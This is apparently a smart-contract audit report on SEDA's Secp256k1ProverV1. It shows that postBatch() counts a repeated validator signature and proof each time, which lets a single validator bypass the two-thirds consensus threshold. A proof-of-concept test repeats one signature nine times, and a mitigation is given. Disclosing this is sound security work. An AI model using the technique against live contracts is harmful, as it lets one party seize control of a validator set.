# Duplicate Signer Proof Allows Bypass of 2/3 Consensus

### Summary

The [`Secp256k1ProverV1`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-evm-contracts/contracts/provers/Secp256k1ProverV1.sol#L110-L120) contract does not enforce that each validator can only sign once per batch. Instead, it sums up the validator’s voting power each time their proof/signature pair is provided. This means a single validator can artificially inflate voting power to exceed the two-thirds threshold.


### Root Cause

The [`Secp256k1ProverV1`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-evm-contracts/contracts/provers/Secp256k1ProverV1.sol#L110-L120) contract does not enforce one-signature-per-validator per batch. It will credit the same validator’s voting power repeatedly if the same proof/signature is submitted multiple times.

### Internal Pre-conditions

The `deployer/owner` calls the initialize function which sets the [`lastValidatorsRoot`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-evm-contracts/contracts/provers/Secp256k1ProverV1.sol#L73) in the system.

### External Pre-conditions

None

### Attack Path

1. All validators sign a batch who are a part of a `lastValidatorsRoot` providing their signatures of the batch and the proof of the being in the `lastValidatorsRoot` merkle root.
2.  The contract has a public function `postBatch()` it utilizes these signatures and proofs of different validators.
3. Instead of utilizing all of these signatures and proofs of validators, a malicious validator can includes his proof and signature multiple times. (If his voting power is 5%, he includes it 14 times which bypasses the threshold of 66%).
4. The `postBatch()` successfully gets executed with arbitrary parameters undermining 2/3 mechanism.

### Impact

1. The entire reason for the 2/3 requirement is to ensure that a single validator cannot finalize state changes alone. If that same validator can just sign once and reuse that signature repeatedly, they effectively become the sole authority
2. A malicious validator can overwrite the `validatorsRoot` for the contract by calling `postBatch()` with his defined parameters essentially kicking out other validators.
3. A malicious validator can mine arbitrary amount of batches incrementing `batchHeight` which may not be intended.

### PoC

Add the following testcase in the file  `test/prover/Secp256k1ProverV1.test.ts` under `batch management`'s describe function.
```js
it('allows repeating the same validator multiple times, artificially inflating voting power', async () => {
      const { prover, wallets, data } = await loadFixture(deployProverFixture);

      const { newBatch, signatures } = await generateAndSignBatch(wallets, data.initialBatch, [0, 1, 2, 3]);
      // Repeat the same signature 4 times
      const repeatedSignatures = [
        signatures[1], 
        signatures[1], 
        signatures[1], 
        signatures[1], 
        signatures[1], 
        signatures[1], 
        signatures[1],
        signatures[1],
        signatures[1]
      ];

      // Repeat the same validator proof 4 times (assuming data.validatorProofs[1] corresponds to validator #1)
      const repeatedProofs = [
        data.validatorProofs[1],
        data.validatorProofs[1],
        data.validatorProofs[1],
        data.validatorProofs[1],
        data.validatorProofs[1],
        data.validatorProofs[1],
        data.validatorProofs[1],
        data.validatorProofs[1],
        data.validatorProofs[1],
      ];

      await prover.postBatch(newBatch, repeatedSignatures, repeatedProofs);

      const lastBatchHeight = await prover.getLastBatchHeight();
      const lastValidatorsRoot = await prover.getLastValidatorsRoot();
      expect(lastBatchHeight).to.equal(newBatch.batchHeight);
      expect(lastValidatorsRoot).to.equal(newBatch.validatorsRoot);
  });
```

### Mitigation

Enforce that each `signer/validator` can only appear once in a single `postBatch()` call.
